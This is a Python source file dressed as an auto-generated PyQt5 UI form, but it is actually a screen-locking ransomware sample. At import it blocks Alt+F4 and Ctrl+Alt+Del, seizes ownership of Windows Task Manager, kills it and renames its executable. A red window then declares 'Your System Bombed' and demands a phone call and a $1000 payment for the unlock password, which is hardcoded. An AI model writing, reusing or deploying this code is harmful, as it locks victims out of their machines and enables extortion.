# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'compiler.ui'
#
# Created by: PyQt5 UI code generator 5.15.7
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.

GfHkKM = "1234"
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt
import keyboard
keyboard.add_hotkey("alt + f4", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + alt + del", lambda: None, suppress =True)
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
import os
path1 = "C:\Windows\System32\Taskmgr.exe"
path2 = "C:\Windows\System32\Taskmgr1.exe"

os.system("takeown /f C:\Windows\System32\Taskmgr.exe")
os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l")
os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l") # убиваем диспетчер задач если он запущен

os.system("taskkill /im taskmgr.exe") # убиваем диспетчер задач если он запущен
os.rename(path1, path2)#перименовываем файл чтобы система не могла его найти


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(800, 600)
        MainWindow.setStyleSheet("background-color: rgb(170, 0, 0);")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(0, 0, 781, 291))
        font = QtGui.QFont()
        font.setFamily("Tw Cen MT")
        font.setPointSize(28)
        self.label.setFont(font)
        self.label.setAlignment(QtCore.Qt.AlignCenter)
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(80, 210, 621, 81))
        font = QtGui.QFont()
        font.setFamily("Tw Cen MT")
        font.setPointSize(18)
        self.label_2.setFont(font)
        self.label_2.setAlignment(QtCore.Qt.AlignCenter)
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(100, 400, 591, 141))
        font = QtGui.QFont()
        font.setPointSize(36)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.textEdit = QtWidgets.QTextEdit(self.centralwidget)
        self.textEdit.setGeometry(QtCore.QRect(20, 300, 541, 71))
        self.textEdit.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.textEdit.setStyleSheet("background-color: rgb(255, 255, 255);\n"
"border-radius: 20px;\n"
"font-size: 30px;\n"
"color: black;\n"
"text-align: senter;")
        self.textEdit.setObjectName("textEdit")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(570, 300, 231, 71))
        font = QtGui.QFont()
        font.setFamily("Orbitron")
        font.setPointSize(24)
        font.setBold(True)
        font.setItalic(False)
        font.setWeight(75)
        self.pushButton.setFont(font)
        self.pushButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.pushButton.setStyleSheet("background-color: rgb(255, 255, 255);\n"
"border-radius: 20px;\n"
"color: black;")
        self.pushButton.setObjectName("pushButton")
        MainWindow.setWindowFlags(Qt.WindowMaximizeButtonHint)
        self.Enter()
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Your System Bombed"))
        self.label.setText(_translate("MainWindow", "Your System Bombed"))
        self.label_2.setText(_translate("MainWindow", "Call this number to unbomb your system"))
        self.label_3.setText(_translate("MainWindow", "+677 930290 92-390"))
        self.textEdit.setWhatsThis(_translate("MainWindow", "This is password what your get if pay me 1000$"))
        self.textEdit.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'MS Shell Dlg 2\'; font-size:30px; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
        self.textEdit.setPlaceholderText(_translate("MainWindow", "Enter password"))
        self.pushButton.setText(_translate("MainWindow", "Send"))

    def Enter(self):
        self.pushButton.clicked.connect(self.check_pass)

    def check_pass(self):
        if self.textEdit.toPlainText() == GfHkKM:
            os.rename(path2, path1)
            quit()
        else:
            pass



if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
    input()